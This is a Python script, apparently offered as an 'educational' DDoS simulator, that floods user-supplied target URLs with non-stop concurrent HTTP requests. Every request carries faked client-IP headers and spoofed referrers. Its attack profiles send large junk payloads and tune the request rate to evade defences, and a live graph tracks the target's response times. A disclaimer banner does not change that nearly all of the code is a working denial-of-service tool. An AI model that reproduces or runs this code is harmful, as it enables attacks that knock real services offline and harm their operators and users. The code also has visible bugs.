import asyncio
import aiohttp
import time
import random
import argparse
import json
import logging
import threading
import ssl
import matplotlib.pyplot as plt
from faker import Faker
from dataclasses import dataclass
from typing import Dict, List, Tuple
from tqdm import tqdm
import numpy as np
import matplotlib.animation as animation
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

# Setup logging
logging.basicConfig(
    filename="ddos_attack_nonstop.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

fake = Faker()

# Common Referrers for Spoofing
REFERRERS = [
    "https://www.google.com/search?q=", "https://www.bing.com/search?q=", 
    "https://search.yahoo.com/search?p=", "https://duckduckgo.com/?q=",
    "https://www.reddit.com/r/", "https://twitter.com/search?q=",
    "https://www.facebook.com/search/top?q="
]

# Attack Profile Definition
@dataclass
class AttackProfile:
    name: str
    methods: list
    headers: dict
    payload_generator: callable
    delay_variance: float
    bandwidth_limit: int
    packet_size_range: Tuple[int, int]
    spoof_referrer: bool = True
    aggressive_factor: float = 1.0  # Multiplier for intensity

    def generate_request(self, request_id: int, urls: List[str]) -> dict:
        method = random.choice(self.methods)
        headers = {k: v() if callable(v) else v for k, v in self.headers.items()}
        headers["X-Forwarded-For"] = fake.ipv4()
        headers["X-Real-IP"] = fake.ipv4()
        headers["X-Client-IP"] = fake.ipv4()
        if self.spoof_referrer:
            headers["Referer"] = random.choice(REFERRERS) + fake.word() + urlparse(random.choice(urls)).path
        headers["Accept-Language"] = random.choice(["en-US", "en-GB", "fr-FR", "de-DE", "zh-CN", "ja-JP"])
        headers["Accept"] = random.choice(["text/html", "application/json", "*/*"])
        headers["Cache-Control"] = random.choice(["no-cache", "no-store", "max-age=0"])
        headers["Connection"] = "keep-alive"
        headers["Pragma"] = "no-cache"
        
        payload_size = int(random.randint(self.packet_size_range[0], self.packet_size_range[1]) * self.aggressive_factor)
        payload = self.payload_generator(payload_size)
        return {
            "id": request_id,
            "method": method,
            "url": random.choice(urls),
            "headers": headers,
            "payload": payload,
            "delay_variance": self.delay_variance,
            "bandwidth_limit": self.bandwidth_limit
        }

# Default Profiles
DEFAULT_PROFILES = [
    AttackProfile(
        name="Stealth Traffic",
        methods=["GET"],
        headers={"User-Agent": lambda: fake.user_agent()},
        payload_generator=lambda size: None,
        delay_variance=0.2,
        bandwidth_limit=4096*1024,  # 4MB/s
        packet_size_range=(0, 0),
        spoof_referrer=True,
        aggressive_factor=1.0
    ),
    AttackProfile(
        name="API Overload",
        methods=["POST", "PUT", "PATCH"],
        headers={"User-Agent": lambda: fake.user_agent(), "Content-Type": "application/json"},
        payload_generator=lambda size: json.dumps({"id": random.randint(1, 100000), "data": fake.text(max_nb_chars=size)}),
        delay_variance=0.02,
        bandwidth_limit=2048*1024,  # 2MB/s
        packet_size_range=(2048, 8192),
        spoof_referrer=False,
        aggressive_factor=1.5
    ),
    AttackProfile(
        name="Data Tsunami",
        methods=["POST"],
        headers={"User-Agent": lambda: fake.user_agent(), "Content-Length": lambda: str(random.randint(8192, 32768))},
        payload_generator=lambda size: fake.text(max_nb_chars=size) + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=size)),
        delay_variance=0.005,
        bandwidth_limit=1024*1024,  # 1MB/s
        packet_size_range=(8192, 32768),
        spoof_referrer=True,
        aggressive_factor=2.0
    )
]

# Metrics Class
class Metrics:
    def __init__(self):
        self.success = 0
        self.failure = 0
        self.response_times = []
        self.retries = 0
        self.lock = asyncio.Lock()
        self.start_time = time.time()
        self.history = []
        self.total_requests = 0

    async def record(self, success: bool, response_time: float, retry: bool = False):
        async with self.lock:
            self.total_requests += 1
            if success:
                self.success += 1
            else:
                self.failure += 1
            self.response_times.append(response_time)
            if retry:
                self.retries += 1
            self.history.append((time.time() - self.start_time, response_time))

    def summary(self) -> Dict:
        total = self.total_requests
        avg_time = sum(self.response_times) / len(self.response_times) if self.response_times else 0
        elapsed = time.time() - self.start_time
        req_per_sec = total / elapsed if elapsed > 0 else 0
        return {
            "total_requests": total,
            "success": self.success,
            "failure": self.failure,
            "retries": self.retries,
            "success_rate": (self.success / total) * 100 if total > 0 else 0,
            "avg_response_time": avg_time,
            "min_response_time": min(self.response_times or [0]),
            "max_response_time": max(self.response_times or [0]),
            "requests_per_second": req_per_sec
        }

    def real_time_stats(self):
        summary = self.summary()
        return (f"Real-Time: Total: {summary['total_requests']} | Success: {summary['success']} | "
                f"Fail: {summary['failure']} | Retries: {summary['retries']} | "
                f"Avg Time: {summary['avg_response_time']:.3f}s | Req/s: {summary['requests_per_second']:.2f}")

# Live Graphing
def live_plot(metrics: Metrics):
    fig, ax = plt.subplots(figsize=(16, 9))
    ax.set_title("Live Non-Stop DDoS Attack Response Times")
    ax.set_xlabel("Time Since Start (s)")
    ax.set_ylabel("Response Time (s)")
    ax.grid(True, alpha=0.3)
    line, = ax.plot([], [], 'r-', label="Response Time")
    ax.legend()

    def update(frame):
        times, rts = zip(*metrics.history) if metrics.history else ([], [])
        line.set_data(times, rts)
        ax.relim()
        ax.autoscale_view()
        return line,

    ani = animation.FuncAnimation(fig, update, interval=200, blit=True, cache_frame_data=False)
    plt.show(block=False)

# Final Plotting
def plot_metrics(metrics_summary: Dict):
    plt.figure(figsize=(16, 9))
    plt.hist(metrics_summary["response_times"], bins=100, color='purple', alpha=0.7)
    plt.title("Non-Stop DDoS Attack Response Time Distribution")
    plt.xlabel("Time (s)")
    plt.ylabel("Frequency")
    plt.grid(True, alpha=0.3)
    plt.savefig("attack_response_times_nonstop.png")
    print("Final response time distribution saved as 'attack_response_times_nonstop.png'")
    plt.close()

# Dynamic Rate Adjustment
def adjust_rate(current_rate: float, metrics: Metrics) -> float:
    summary = metrics.summary()
    success_rate = summary["success_rate"]
    if success_rate > 90:
        return max(current_rate * 0.8, 0.001)  # Ramp up intensity
    elif success_rate < 30:
        return min(current_rate * 1.3, 0.5)    # Slow down to evade
    return current_rate * random.uniform(0.9, 1.1)  # Random jitter

# Generate Requests in Background
def generate_requests(urls: List[str], profiles: List[AttackProfile], request_queue: asyncio.Queue, stop_event: threading.Event):
    request_id = 1
    while not stop_event.is_set():
        for profile in random.choices(profiles, k=1):
            req = profile.generate_request(request_id, urls)
            asyncio.run_coroutine_threadsafe(request_queue.put(req), asyncio.get_event_loop())
            request_id += 1
            time.sleep(random.uniform(0.001, 0.01))  # Micro-pause to prevent CPU overload

# Async Request Sender
async def send_request(session: ClientSession, req: Dict, metrics: Metrics, rate_limit: float, max_retries: int = 10):
    attempt = 0
    while attempt < max_retries:
        try:
            start_time = time.time()
            payload_size = len(req["payload"].encode('utf-8')) if req["payload"] else 0
            delay = payload_size / req["bandwidth_limit"] if req["bandwidth_limit"] > 0 else 0
            
            await asyncio.sleep(random.uniform(0, delay * 0.1))  # Random micro-delay
            
            async with session.request(
                method=req["method"],
                url=req["url"],
                headers=req["headers"],
                data=req["payload"],
                timeout=aiohttp.ClientTimeout(total=15),
                ssl=ssl.create_default_context()
            ) as response:
                elapsed_time = time.time() - start_time
                success = response.status in (200, 201, 204, 301, 302)
                await metrics.record(success, elapsed_time)
                logging.info(f"Request {req['id']}: {req['method']} - {req['url']} - Status {response.status} - Time {elapsed_time:.3f}s")
                break
        except Exception as e:
            elapsed_time = time.time() - start_time
            attempt += 1
            await metrics.record(False, elapsed_time, retry=(attempt < max_retries))
            logging.error(f"Request {req['id']}: {req['method']} - Attempt {attempt}/{max_retries} - Error: {e}")
            if attempt == max_retries:
                logging.error(f"Request {req['id']} failed after {max_retries} retries")
            await asyncio.sleep(random.uniform(0.1, 1.0) * attempt)
    await asyncio.sleep(rate_limit + random.uniform(0, req["delay_variance"]))

# Main Attack Function (Non-Stop)
async def run_attack(urls: List[str], concurrency: int, initial_rate_limit: float, profiles: List[AttackProfile]):
    metrics = Metrics()
    request_queue = asyncio.Queue(maxsize=concurrency * 10)
    stop_event = threading.Event()
    
    # Start request generator in background
    generator_thread = threading.Thread(target=generate_requests, args=(urls, profiles, request_queue, stop_event), daemon=True)
    generator_thread.start()
    
    print(f"\nStarting Non-Stop DDoS Simulation on {', '.join(urls)} by It Is Unique Official")
    print(f"Concurrency: {concurrency}, Initial Rate Limit: {initial_rate_limit}s")
    print("Attack will run until manually stopped (Ctrl+C)...")
    
    rate_limit = initial_rate_limit
    tasks = []
    try:
        async with aiohttp.ClientSession(
            headers={"User-Agent": fake.user_agent()},
            cookie_jar=aiohttp.CookieJar(unsafe=True)
        ) as session:
            while True:  # Non-stop loop
                if len(tasks) < concurrency and not request_queue.empty():
                    req = await request_queue.get()
                    tasks.append(asyncio.create_task(send_request(session, req, metrics, rate_limit)))
                
                if tasks:
                    done, pending = await asyncio.wait(tasks, timeout=0.1, return_when=asyncio.FIRST_COMPLETED)
                    tasks = list(pending)
                    for task in done:
                        task.result()  # Ensure exceptions are raised
                
                rate_limit = adjust_rate(rate_limit, metrics)
                print(f"\r{metrics.real_time_stats()}", end="")
                
                await asyncio.sleep(0.01)  # Prevent event loop starvation
    
    except KeyboardInterrupt:
        print("\nStopping attack...")
        stop_event.set()
        generator_thread.join()
        for task in tasks:
            task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
    
    return metrics

# Execute Attack
def execute_attack(urls: List[str], concurrency: int, rate_limit: float, profiles: List[AttackProfile]):
    start_time = time.time()
    metrics = Metrics()
    
    plot_thread = threading.Thread(target=live_plot, args=(metrics,), daemon=True)
    plot_thread.start()
    
    metrics = asyncio.run(run_attack(urls, concurrency, rate_limit, profiles))
    total_time = time.time() - start_time
    
    summary = metrics.summary()
    print("\n\n=== Non-Stop DDoS Simulation Summary ===")
    print("Developed by It Is Unique Official")
    for key, value in summary.items():
        print(f"{key.replace('_', ' ').title()}: {value:.2f}" if isinstance(value, float) else f"{key.replace('_', ' ').title()}: {value}")
    print(f"Total Time Taken: {total_time:.2f}s")
    
    plot_metrics(summary)
    logging.info(f"Attack completed in {total_time:.2f}s")

# CLI Setup
def main():
    parser = argparse.ArgumentParser(description="Network-DDoS: Non-Stop Educational DDoS Simulation Tool by It Is Unique Official")
    parser.add_argument("--url", action="append", required=True, help="Target URL(s) to simulate attack on (can be specified multiple times)")
    parser.add_argument("--concurrency", type=int, default=50, help="Number of concurrent connections")
    parser.add_argument("--rate-limit", type=float, default=0.05, help="Initial delay between requests (seconds)")
    parser.add_argument("--custom-profile", help="JSON string for custom attack profile (e.g., '{\"name\": \"Test\", \"methods\": [\"GET\"], \"headers\": {\"User-Agent\": \"test\"}, \"payload\": \"test data\", \"delay_variance\": 0.1, \"bandwidth_limit\": 1024000, \"packet_size_range\": [512, 2048], \"aggressive_factor\": 1.5}')")
    
    args = parser.parse_args()
    
    print("\nWARNING: This tool is for EDUCATIONAL PURPOSES ONLY. Use it only on servers you own or have permission to test.")
    print("Unauthorized use is ILLEGAL and UNETHICAL. This is a NON-STOP attack—stop with Ctrl+C.\n")
    
    profiles = DEFAULT_PROFILES.copy()
    if args.custom_profile:
        try:
            custom_data = json.loads(args.custom_profile)
            custom_profile = AttackProfile(
                name=custom_data.get("name", "Custom"),
                methods=custom_data.get("methods", ["GET"]),
                headers=custom_data.get("headers", {"User-Agent": lambda: fake.user_agent()}),
                payload_generator=lambda size: custom_data.get("payload", fake.text(max_nb_chars=size)),
                delay_variance=custom_data.get("delay_variance", 0.1),
                bandwidth_limit=custom_data.get("bandwidth_limit", 1024*1024),
                packet_size_range=tuple(custom_data.get("packet_size_range", [512, 2048])),
                spoof_referrer=custom_data.get("spoof_referrer", True),
                aggressive_factor=custom_data.get("aggressive_factor", 1.0)
            )
            profiles.append(custom_profile)
            print(f"Added custom profile: {custom_data['name']}")
        except json.JSONDecodeError as e:
            print(f"Error parsing custom profile JSON: {e}")
            return
    
    execute_attack(args.url, args.concurrency, args.rate_limit, profiles)

if __name__ == "__main__":
    asyncio.run(main())
